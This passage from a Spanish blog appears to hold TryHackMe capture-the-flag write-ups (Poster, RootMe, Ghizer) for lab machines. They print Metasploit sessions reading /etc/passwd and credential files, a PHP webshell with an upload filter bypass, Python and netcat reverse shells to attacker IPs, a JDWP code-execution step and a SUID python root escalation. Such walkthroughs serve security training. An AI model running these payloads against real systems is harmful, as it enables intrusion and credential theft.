RPORT 5432 yes The target port USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; set rhosts poster.thm rhosts =\u0026gt; poster.thm msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; set PASSWORD [... REDACTED ...] PASSWORD =\u0026gt; [... REDACTED ...] msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_readfile): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD [... REDACTED ...] no The password for the specified username. Leave blank for a random password. RFILE /etc/passwd yes The remote file RHOSTS poster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; run [*] Running module against 10.10.111.10 Query Text: \u0026#39;CREATE TEMP TABLE FEtNusWQceZc (INPUT TEXT); COPY FEtNusWQceZc FROM \u0026#39;/etc/passwd\u0026#39;; SELECT * FROM FEtNusWQceZc\u0026#39; ======================================================================================================================================= input ----- #/home/dark/credentials.txt _apt:x:105:65534::/nonexistent:/bin/false alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin dark:x:1001:1001::/home/dark: games:x:5:60:games:/usr/games:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin messagebus:x:106:110::/var/run/dbus:/bin/false news:x:9:9:news:/var/spool/news:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash proxy:x:13:13:proxy:/bin:/usr/sbin/nologin root:x:0:0:root:/root:/bin/bash sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync sys:x:3:3:sys:/dev:/usr/sbin/nologin syslog:x:104:108::/home/syslog:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin uuidd:x:107:111::/run/uuidd:/bin/false www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin [+] 10.10.111.10:5432 Postgres - /etc/passwd saved in /home/kali/.msf4/loot/20200912002939_default_10.10.111.10_postgres.file_993710.txt [*] Auxiliary module execution completed msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; Realizamos la lectura de este archivo sospechoso y vemos que son \u0026ldquo;credenciales\u0026rdquo; de uno de los usuarios del servidor.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; set RFILE /home/dark/credentials.txt RFILE =\u0026gt; /home/dark/credentials.txt msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; run [*] Running module against 10.10.111.10 Query Text: \u0026#39;CREATE TEMP TABLE bqGyoC (INPUT TEXT); COPY bqGyoC FROM \u0026#39;/home/dark/credentials.txt\u0026#39;; SELECT * FROM bqGyoC\u0026#39; ==================================================================================================================================== input ----- dark:[... REDACTED ...] dark:qwerty1234#!hackme [+] 10.10.111.10:5432 Postgres - /home/dark/credentials.txt saved in /home/kali/.msf4/loot/20200912003043_default_10.10.111.10_postgres.file_281669.txt [*] Auxiliary module execution completed msf5 auxiliary(admin/postgres/postgres_readfile) \u0026gt; Tambien existe un modulo con el cual podemos realizar una ejecucion de comandos utilizando las credenciales de un usuario de postgres.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; set PASSWORD [... REDACTED ...] PASSWORD =\u0026gt; [... REDACTED ...] msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; set rhosts poster.thm msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; set LHOST tun0 LHOST =\u0026gt; 10.10.10.10 msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; set LPORT 1338 LPORT =\u0026gt; 1338 msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; show options Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against DUMP_TABLE_OUTPUT false no select payload command output from table (For Debugging) PASSWORD [... REDACTED ...] no The password for the specified username. Leave blank for a random password. RHOSTS poster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port (TCP) TABLENAME kkskRfiV8Yxo yes A table name that does not exist (To avoid deletion) USERNAME postgres yes The username to authenticate as Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.10.10 yes The listen address (an interface may be specified) LPORT 1338 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; run [*] Started reverse TCP handler on 10.10.10.10:1338 [*] 10.10.111.10:5432 - 10.10.111.10:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit [*] 10.10.111.10:5432 - Exploiting... [+] 10.10.111.10:5432 - 10.10.111.10:5432 - kkskRfiV8Yxo dropped successfully [+] 10.10.111.10:5432 - 10.10.111.10:5432 - kkskRfiV8Yxo created successfully [+] 10.10.111.10:5432 - 10.10.111.10:5432 - kkskRfiV8Yxo copied successfully(valid syntax/command) [*] Command shell session 1 opened (10.10.10.10:1338 -\u0026gt; 10.10.111.10:57476) at 2020-09-12 00:40:40 -0400 [+] 10.10.111.10:5432 - 10.10.111.10:5432 - kkskRfiV8Yxo dropped successfully(Cleaned) [*] 10.10.111.10:5432 - Exploit Succeeded id uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert) whoami postgres pwd /var/lib/postgresql/9.5/main DARK - USER Utilizamos las credenciales en el servicio ssh y logramos obtener una shell.\nALISON - USER Realizamos una enumeracion en la maquina ya que la flag user.txt se encuentra en la carpeta de la usuario Alison en la que no tenemos acceso. En un archivo de configuracion de la pagina web que esta corriendo en el puerto 80 encontramos unas credenciales que podrian pertencer a Alison. Utilizamos estas credenciales, logramos obtener una shell con Alison y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para cualquier comando. Utilizamos sudo su para obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Poster es una maquina de TryHackMe, esta enfocada en PostgreSQL medio por el cual se obtuvieron credenciales para acceder por SSH. Credenciales almacenadas nos dieron acceso al siguiente usuario. Escalamos privilegios utilizando Sudo.","id":96,"section":"posts","tags":["postgresql","metasploit"],"title":"TryHackMe - Poster","uri":"https://sckull.github.io/posts/poster/"},{"content":"\rRootMe es una maquina de TryHackMe con dificultad Facil donde obtuvimos acceso con una shell inversa tras realizar bypass al filtro de ficheros. Encontramos a Python con permisos SUID, nos ayudo a obtener acceso como root.\nRoom Titulo RootMe Descripción A ctf for beginners, can you root me? Puntos 410 Dificultad Facil Maker ReddyyZ NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Thu Sep 10 00:43:26 2020 as: nmap -Pn -sV -o mini_scan rootme.thm Nmap scan report for rootme.thm (10.10.74.187) Host is up (0.31s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Sep 10 00:44:08 2020 -- 1 IP address (1 host up) scanned in 42.04 seconds HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 kali@kali:~/thm/rootme$ gobuster dir -u http://rootme.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /css (Status: 301) /index.php (Status: 200) /js (Status: 301) /panel (Status: 301) /server-status (Status: 403) /uploads (Status: 301) WWW-DATA - USER En /panel encontramos un formulario para subir archivos.\nIntentamos subir un archivo PHP que contiene una mini webshell pero nos muestra un error. Al parecer los archivos PHP no estan permitidos.\n1 \u0026lt;?php echo(system($_GET[\u0026#39;cmd\u0026#39;])); ?\u0026gt; Cambiamos el nombre del archivo a shell.php5 e intentamos nuevamente, ahora nos muestra un mensaje de que se subio exitosamente.\nEn /uploads vemos nuestra webshell.\nLe pasamos un comando a nuestra webshell y logramos ver el resultado de su ejecucion.\nEjecutamos una shell inversa utilizando nuestra webshell.\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.10.10\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; Ponemos a la escucha netcat junto a rlwrap en nuestra maquina (local).\n1 rlwrap nc -lvp 1338 Logramos obtener una shell con el usuario www-data.\nY nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de binarios SUID y vemos a python en la lista.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 bash-4.4$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Jan 8 2020 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su -rwsr-xr-x 1 root root 27K Jan 8 2020 /bin/umount [... REDACTED ...] -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-sr-x 1 root root 3.5M Aug 4 17:47 /usr/bin/python -rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 18:25 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 111K Jul 10 14:00 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic bash-4.4$ Además de ello vemos en el archivo de historial de comandos que alguien utilizo python para ejecutar una shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 bash-4.4$ cat .bash_history id whoami ls ls cd /var ls cd www ls cat user.txt find / -perm /4000 python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; exit bash-4.4$ Utilizamos el comando de GTFOBins - Python para ejecutar una shell como usuario root.\n1 /usr/bin/python -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; Logramos obtener nuestra shell y nuestra flag root.txt.\n","description":"RootMe es una maquina de TryHackMe con dificultad Facil donde obtuvimos acceso con una shell inversa tras realizar bypass al filtro de ficheros. Encontramos a Python con permisos SUID, nos ayudo a obtener acceso como root.","id":97,"section":"posts","tags":["suid"],"title":"TryHackMe - RootMe","uri":"https://sckull.github.io/posts/rootme/"},{"content":"\rGhizer es una maquina de TryHackMe, encontramos un HoneyPot en el puerto FTP. Explotamos un RCE en LimeSurvey lo que nos dio acceso a la maquina. Encontramos JDWP el cual nos conectamos para obtener acceso al siguiente usuario. Tenemos permisos para ejecutar un script con Python3 al cual realizamos Python Library Hijacking para escalar privilegios.\nRoom Titulo Ghizer Descripción lucrecia has installed multiple web applications on the server. Puntos 220 Dificultad Media Maker stuxnet NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), ssl/https (443), servicio de java(?) (18002) y algunos otros puertos abiertos que no logramos obtener informacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 18:24 EDT Nmap scan report for 10.10.26.105 (10.10.26.105) Host is up (0.31s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp? 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.80%I=7%D=9/4%Time=5F52BEA9%P=x86_64-pc-linux-gnu%r(NULL, SF:33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203 SF:\\.0\\.3\\)\\n\u0026#34;)%r(GenericLines,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FT SF:P\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x2 SF:0USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(Help,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous SF:\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20w SF:ith\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(GetRequest,58,\u0026#34;220\\x20Welcome\\x20to\\ SF:x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x SF:20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(HTTPOptions,58,\u0026#34;220\\x20W SF:elcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n53 SF:0\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(RTSPRequest SF:,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x20 SF:3\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)% SF:r(RPCCheck,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\( SF:vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(DNSVersionBindReqTCP,58,\u0026#34;220\\x20Welcome\\x20to SF:\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\ SF:x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(DNSStatusRequestTCP,58, SF:\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0 SF:\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(SS SF:LSessionReq,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\ SF:(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(TerminalServerCookie,33,\u0026#34;220\\x20Welcome\\x20t SF:o\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(TLSSessi SF:onReq,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTP SF:d\\x203\\.0\\.3\\)\\n\u0026#34;)%r(Kerberos,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20 SF:FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(SMBProgNeg,33,\u0026#34;220\\x20Welc SF:ome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r( SF:X11Probe,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vs SF:FTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PAS SF:S\\.\\n\u0026#34;)%r(FourOhFourRequest,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FT SF:P\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x2 SF:0USER\\x20and\\x20PASS\\.\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 202.88 seconds Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 18:25 EDT Warning: 10.10.26.105 giving up on port because retransmission cap hit (2). Nmap scan report for ghizer.thm (10.10.26.105) Host is up (0.25s latency). Not shown: 64833 closed ports, 696 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 443/tcp open https 18002/tcp open unknown 36625/tcp open unknown 45775/tcp open unknown Nmap scan report for ghizer.thm (10.10.26.105) Host is up (0.25s latency). PORT STATE SERVICE VERSION 21/tcp open ftp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: | 220 Welcome to Anonymous FTP server (vsFTPd 3.0.3) | Please login with USER and PASS. | Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |_ 220 Welcome to Anonymous FTP server (vsFTPd 3.0.3) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: LimeSurvey http://www.limesurvey.org |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: LimeSurvey 443/tcp open ssl/ssl Apache httpd (SSL-only mode) |_http-generator: WordPress 5.4.2 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Ghizer \u0026amp;#8211; Just another WordPress site | ssl-cert: Subject: commonName=ubuntu | Not valid before: 2020-07-23T17:27:31 |_Not valid after: 2030-07-21T17:27:31 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 18002/tcp open java-rmi Java RMI | rmi-dumpregistry: | jmxrmi | javax.management.remote.rmi.RMIServerImpl_Stub | @127.0.1.1:33943 | extends | java.rmi.server.RemoteStub | extends |_ java.rmi.server.RemoteObject 36625/tcp closed unknown 45775/tcp closed unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.80%I=7%D=8/14%Time=5F365C14%P=x86_64-pc-linux-gnu%r(NULL SF:,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x20 SF:3\\.0\\.3\\)\\n\u0026#34;)%r(GenericLines,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20F SF:TP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x SF:20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(Help,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymou SF:s\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20 SF:with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(GetRequest,58,\u0026#34;220\\x20Welcome\\x20to SF:\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\ SF:x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(HTTPOptions,58,\u0026#34;220\\x20 SF:Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n5 SF:30\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(RTSPReques SF:t,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x2 SF:03\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;) SF:%r(RPCCheck,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\ SF:(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(DNSVersionBindReqTCP,58,\u0026#34;220\\x20Welcome\\x20t SF:o\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please SF:\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(DNSStatusRequestTCP,58 SF:,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\. SF:0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n\u0026#34;)%r(S SF:SLSessionReq,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20 SF:\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(TerminalServerCookie,33,\u0026#34;220\\x20Welcome\\x20 SF:to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(TLSSess SF:ionReq,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFT SF:Pd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(Kerberos,33,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x2 SF:0FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r(SMBProgNeg,33,\u0026#34;220\\x20Wel SF:come\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\u0026#34;)%r SF:(X11Probe,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(v SF:sFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PA SF:SS\\.\\n\u0026#34;)%r(FourOhFourRequest,58,\u0026#34;220\\x20Welcome\\x20to\\x20Anonymous\\x20F SF:TP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x SF:20USER\\x20and\\x20PASS\\.\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . FTP Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous) en el cual encontramos varios archivos entre ellos las flag root.txt y user.txt, al intentar obtener uno de estos archivos muestra un mensaje de permiso denegado por lo que no logramos hacer nada en este servicio, además es muy raro porque comunmente es posible realizar ls -lah para observar los archivos ocultos, algo que no se pudo lograr en este servicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 kali@kali:~/thm/ghizer$ ftp ghizer.thm Connected to ghizer.thm. 220 Welcome to Anonymous FTP server (vsFTPd 3.0.3) Name (ghizer.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -r-x------ 1 0 0 1351 Feb 7 2019 client.py -r-x------ 1 0 0 54324 Feb 7 2019 test.c -r-x------ 1 0 0 1024 Nov 28 2019 prototype.c -rwx------ 1 0 0 4096 Jan 4 2019 root.txt -r-x------ 1 0 0 45550 Dec 12 2019 user.txt -r-x------ 1 0 0 45550 Dec 12 2019 i_honeypot.py 226 Directory send OK. ftp\u0026gt; get user.txt local: user.txt remote: user.txt Permission denied. 200 PORT command successful. Consider using PASV. 550 Permission denied. ftp\u0026gt; pwd 257 \u0026#34;/home/lucrecia/ftp/\u0026#34; is the current directory ftp\u0026gt; get root.txt local: root.txt remote: root.txt Permission denied. 200 PORT command successful. Consider using PASV. 550 Permission denied. ftp\u0026gt; bye 221 Goodbye. kali@kali:~/thm/ghizer$ HTTP Encontramos una pagina web en el puerto 80, al parecer es una aplicacion web para realizar encuestas.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 kali@kali:~/thm/ghizer$ gobuster dir -u http://ghizer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt /index.php (Status: 200) /docs (Status: 301) /themes (Status: 301) /admin (Status: 301) /assets (Status: 301) /upload (Status: 301) /tests (Status: 301) /plugins (Status: 301) /application (Status: 301) /tmp (Status: 301) /framework (Status: 301) /locale (Status: 301) /installer (Status: 301) /third_party (Status: 301) /server-status (Status: 403) LimeSurvey - RCE Encontramos un exploit que afecta a esta aplicacion la cual necesita unas credenciales para subir una shell y ejecutar comandos, utilizamos las credenciales por defecto y ejecutamos el exploit con los parametros necesarios. Vemos que el usuario que esta ejecutando la aplicacion es www-data.\nActualizamos a una nueva shell en donde podamos realizar una enumeracion más comoda ejecutando una shell inversa de python.\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.2.29.162\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; GHIDRA RCE -\u0026gt; VERONICA Realizamos una enumeracion en la maquina y vemos que en el directorio principal de la usuario veronica esta Ghidra, además de ello vemos los puertos abiertos en la maquina (ojo con 18001).\nExploramos las vulnerabilidades en ghidra y al principio vimos el exploit Ghidra (Linux) 9.0.4 - .gar Arbitrary Code Execution que necesita un archivo de project.gar el cual se puede crear en Ghidra a partir de un proyecto, pero este exploit necesita una interaccion con la interfaz visual de Ghidra. Tambien encontramos la vulnerabilidad Remote Code Execution Through JDWP Debug Port el cual afecta a la version 9.0.4. En esta vulnerabilidad Ghidra abre en modo debug JDWP lo cual permite conectarse al puerto 18001 de localhost.\nTenemos acceso al puerto (18001) localmente con la shell actual por lo que realizamos la explotacion como en la demostracion de la exploitacion, a continuacion los comandos.\n1 2 3 4 5 6 7 #Conexion a jdwp jdb -attach localhost:18001 #Listar las clases disponibles #classpath stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() #Ejecucion de la shell inversa print new java.lang.Runtime().exec(\u0026#34;nc 10.10.10.10 1337 -e /bin/sh\u0026#34;) Logramos obtener 